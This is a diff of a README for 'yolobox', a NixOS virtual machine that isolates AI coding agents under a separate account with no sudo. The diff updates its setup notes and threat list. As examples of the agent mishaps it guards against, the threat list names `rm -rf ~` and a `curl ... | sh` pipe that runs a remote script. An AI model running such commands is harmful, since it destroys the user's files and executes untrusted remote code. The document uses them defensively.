@@ -6,9 +6,9 @@ NixOS machine, run by Lima, devbox, batteries included.
 
 ## Why this exists
 
-- Agents blast radius (`rm -rf /`, `curl http://H4x0r-malware.sh | bash`)
+- Agents blast radius (protects against `rm -rf ~`, `curl http://H4x0r-malware.sh | sh`)
 - Supply chain attacks
-- Slow MacOS SSD access due to `systempolicyd` scanning every disk access.
+- Slow MacOS disk due to `systempolicyd` scans
 
 ## The UI
 
@@ -16,11 +16,17 @@ NixOS machine, run by Lima, devbox, batteries included.
 
 [https://herdr.dev/](https://herdr.dev/)
 
+Guest's herdr is connected with the host. One panel to rule all them agents.
+
 Run `cd myproj && yo enter` or `yo enter <fuzzy search>`
+
 
 ### T3 code web and mobile
 
 [https://t3.codes/](https://t3.codes/)
+
+The single annoyance with the herdr over ssh is, pasting screenshots doen't work.
+T3 Code solves this problem, adds mobile app as a bonus.
 
 Run `yo t3` (also can be paired remotely)
 
@@ -52,21 +58,18 @@ yo bootstrap     # create the VM, build NixOS from the pinned yolobox release, s
 
 The VM has two accounts: you, the **operator** (`${username}`, matched to
 your Mac account, the only one with sudo), and `agent`, the account every
-AI coding session runs as, with no sudo at all. Add both to
-`~/.ssh/config` — the `Match` block ABOVE the `Include`, because ssh keeps
-only the first value it sees per keyword, so a `Match` placed below the
-`Include` never takes effect:
+AI coding session runs as, with no sudo at all. `yo` writes the ssh config
+that keeps the two accounts on separate connections itself; the only thing
+`~/.ssh/config` needs is one line:
 
 ```
-Match host lima-yolobox user agent
-  ControlPath ~/.lima/yolobox/ssh-agent.sock
-
 Include ~/.lima/yolobox/ssh.config
 ```
 
-That lets `ssh lima-yolobox`, Zed and VS Code all find the VM as either
-account, without an agent session ever landing on the operator's own
-connection.
+`yo bootstrap`, `yo code` and `yo zed` offer to add this line for you when
+it is missing. That lets `ssh lima-yolobox`, Zed and VS Code all find the
+VM as either account, without an agent session ever landing on the
+operator's own connection.
 
 Then, in any project under your home directory on the Mac:
 
@@ -124,8 +127,10 @@ file when it exists, so it never needs upstreaming. Then rebuild:
 sudo YOLOBOX_USERNAME=$(id -un) nixos-rebuild switch --impure --flake 'github:aka-rider/yolobox/v<version>#yolobox'
 ```
 
-Use the same flake ref `yo bootstrap` built the box from (`yo --version`
-inside the VM reports the release number; if you built from `YOLOBOX_FLAKE`, use that ref instead). To run your own fork of the whole box instead of
+Use the same flake ref `yo bootstrap` built the box from (`cat
+/etc/yolobox/version` inside the VM reports the release number, and `yo
+status` on the Mac shows it next to the host's; if you built from
+`YOLOBOX_FLAKE`, use that ref instead). To run your own fork of the whole box instead of
 `aka-rider/yolobox`, point `YOLOBOX_FLAKE` at it before `yo bootstrap` —
 both it and the rebuild above will follow, e.g.
 `YOLOBOX_FLAKE=github:you/yolobox/your-branch yo bootstrap`.
